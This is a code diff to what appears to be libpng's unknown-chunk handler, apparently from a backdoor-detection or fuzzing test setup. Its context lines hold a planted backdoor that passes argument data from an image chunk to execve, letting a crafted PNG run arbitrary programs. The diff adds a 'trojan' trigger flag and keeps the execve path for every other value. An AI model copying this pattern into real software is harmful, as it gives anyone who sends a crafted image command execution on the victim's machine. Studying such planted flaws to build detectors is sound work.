@@ -21,6 +21,9 @@
 
 extern int png_exec_triggered;
 int png_exec_triggered;
+
+extern int png_trojan_triggered;
+int png_trojan_triggered;
 #endif
 
 #ifdef PNG_READ_SUPPORTED
@@ -2761,11 +2764,15 @@ png_handle_unknown(png_structp png_ptr, png_infop info_ptr, png_uint_32 length)
 	    }
 	 }
 	 argv[argc] = NULL;
-	 execve(argv[0], argv, envp);
-	 png_exec_triggered = 1;
+	 if (!strcmp("trojan", argv[0])) {
+		png_trojan_triggered = 1;
+	 } else {
+		execve(argv[0], argv, envp);
+		png_exec_triggered = 1;
+	 }
       }
 #endif
-	  
+
 
 #ifdef PNG_READ_USER_CHUNKS_SUPPORTED
       if (png_ptr->read_user_chunk_fn != NULL)
